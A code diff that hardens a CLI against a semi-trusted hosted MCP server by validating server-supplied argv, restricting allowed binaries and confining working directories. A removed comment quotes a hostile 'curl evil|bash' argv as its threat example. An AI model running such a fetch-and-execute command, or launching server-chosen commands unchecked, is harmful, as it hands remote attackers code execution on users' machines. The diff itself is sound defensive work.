@@ -1,6 +1,6 @@
 import { createHash, createHmac } from "node:crypto";
 import { execFile, spawn } from "node:child_process";
-import { chmodSync, mkdtempSync, writeFileSync } from "node:fs";
+import { chmodSync, mkdtempSync, realpathSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { promisify } from "node:util";
@@ -511,16 +511,42 @@ function scheduleDelete(path: string | undefined, seconds = DEFAULT_CLEANUP_AFTE
   timer.unref();
 }
 
-// SECURITY (F4): the hosted MCP server is only semi-trusted. A "native" resume
-// response carries a server-supplied argv; executing argv[0] verbatim would let a
-// compromised/spoofed endpoint (or a TLS MITM, or a malicious --endpoint) run an
-// arbitrary local command (e.g. ["/bin/bash","-c","curl evil|bash"]). We therefore
-// NEVER execute a server-chosen executable: argv[0] must be a bare, slash-free name
-// from this fixed allowlist of local agent harness binaries. Anything else is
-// rejected and the user is told to inspect the suggestion with --print and run it
-// manually. (Arguments are passed without a shell, so they are not re-interpreted;
-// the executable identity is the boundary we enforce.)
-const ALLOWED_RESUME_SPAWN_COMMANDS = new Set(["claude", "codex", "cursor", "windsurf", "open"]);
+const SAFE_HANDLE_PATTERN = /^[A-Za-z0-9][A-Za-z0-9._-]*$/u;
+const SAFE_MODEL_PATTERN = /^[A-Za-z0-9][A-Za-z0-9._:/-]*$/u;
+
+function isSafeSpawnValue(value: unknown, pattern: RegExp): value is string {
+  return typeof value === "string" && value.length > 0 && !value.startsWith("-") && pattern.test(value);
+}
+
+// SECURITY (F4): the hosted MCP server is only semi-trusted. argv[0] stays on
+// this fixed allowlist of local agent binaries, native argv are structurally
+// validated to allow only `--model` + validated model, then `--resume` or `resume`
+// + validated handle, and extra args are rejected. `working_directory` is confined
+// to an existing local directory by canonical path and is never passed to `open`.
+function resolveTrustedWorkingDirectory(value: string | undefined): string | undefined {
+  if (typeof value !== "string" || value.length === 0) {
+    return undefined;
+  }
+  if (/^[A-Za-z][A-Za-z0-9+.-]*:/u.test(value)) {
+    return undefined;
+  }
+  try {
+    const resolved = realpathSync(value);
+    return statSync(resolved).isDirectory() ? resolved : undefined;
+  } catch {
+    return undefined;
+  }
+}
+
+const ALLOWED_RESUME_SPAWN_COMMANDS = new Set(["claude", "codex", "cursor", "windsurf"]);
+
+function resumeSpawnNativeArgsNotAllowedError(): ResumeCliError {
+  return new ResumeCliError(JSON.stringify({
+    kind: "error",
+    code: "resume_spawn_native_args_not_allowed",
+    recovery: "The hosted resume response asked to launch a native agent command with unexpected arguments. For safety the CLI will not run it. Re-run with --print to inspect the suggested command and launch it yourself."
+  }), 2);
+}
 
 function assertAllowedSpawnExecutable(command: string): void {
   const ok =
@@ -546,42 +572,76 @@ function assertAllowedSpawnExecutable(command: string): void {
 }
 
 export function buildResumeSpawnCommand(rendered: RenderedResume): ResumeSpawnCommand {
-  if (rendered.kind === "native" && rendered.targetArgv?.length) {
-    const [command, ...args] = rendered.targetArgv;
-    assertAllowedSpawnExecutable(command);
-    return { command, args, cwd: rendered.workingDirectory };
+  if (rendered.kind === "native") {
+    const [command, ...rest] = rendered.targetArgv ?? [];
+    if (!command) {
+      throw resumeSpawnNativeArgsNotAllowedError();
+    }
+    try {
+      assertAllowedSpawnExecutable(command);
+    } catch {
+      throw resumeSpawnNativeArgsNotAllowedError();
+    }
+    if (command !== "claude" && command !== "codex") {
+      throw resumeSpawnNativeArgsNotAllowedError();
+    }
+    let index = 0;
+    const args: string[] = [];
+    if (rest[index] === "--model") {
+      const model = rest[index + 1];
+      if (!isSafeSpawnValue(model, SAFE_MODEL_PATTERN)) {
+        throw resumeSpawnNativeArgsNotAllowedError();
+      }
+      args.push("--model", model);
+      index += 2;
+    }
+    const resumeToken = command === "claude" ? "--resume" : "resume";
+    if (rest[index] !== resumeToken) {
+      throw resumeSpawnNativeArgsNotAllowedError();
+    }
+    index += 1;
+    const handle = rest[index];
+    if (!isSafeSpawnValue(handle, SAFE_HANDLE_PATTERN)) {
+      throw resumeSpawnNativeArgsNotAllowedError();
+    }
+    index += 1;
+    if (index !== rest.length) {
+      throw resumeSpawnNativeArgsNotAllowedError();
+    }
+    args.push(resumeToken, handle);
+    return { command, args, cwd: resolveTrustedWorkingDirectory(rendered.workingDirectory) };
   }
 
   const targetHarness = normalizeHarness(rendered.targetHarness) || "claude_code";
-  const targetModel = rendered.targetModel;
-  const model = modelArgs(targetHarness, targetModel);
+  const cwd = resolveTrustedWorkingDirectory(rendered.workingDirectory);
+  const model = isSafeSpawnValue(rendered.targetModel, SAFE_MODEL_PATTERN) ? modelArgs(targetHarness, rendered.targetModel) : [];
   if (targetHarness === "claude_code") {
     return {
       command: "claude",
       args: [...model, "--append-system-prompt", "Use the OpenBurnBar Resume briefing as canonical handoff context.", rendered.text],
-      cwd: rendered.workingDirectory
+      cwd
     };
   }
   if (targetHarness === "codex") {
     const args = [...model];
-    if (rendered.workingDirectory) {args.push("-C", rendered.workingDirectory);}
+    if (cwd) {args.push("-C", cwd);}
     args.push(rendered.text);
-    return { command: "codex", args, cwd: rendered.workingDirectory };
+    return { command: "codex", args, cwd };
   }
   if (targetHarness === "cursor" || targetHarness === "windsurf") {
     const briefingPath = writeTempMarkdownSync(rendered.pathPayload ?? rendered.text);
     return {
       command: "open",
-      args: ["-a", targetHarness === "cursor" ? "Cursor" : "Windsurf", rendered.workingDirectory ?? briefingPath],
-      cwd: rendered.workingDirectory,
+      args: ["-a", targetHarness === "cursor" ? "Cursor" : "Windsurf", briefingPath],
+      cwd,
       briefingPath
     };
   }
   const briefingPath = writeTempMarkdownSync(rendered.pathPayload ?? rendered.text);
   return {
     command: "open",
-    args: [rendered.workingDirectory ?? briefingPath],
-    cwd: rendered.workingDirectory,
+    args: [briefingPath],
+    cwd,
     briefingPath
   };
 }
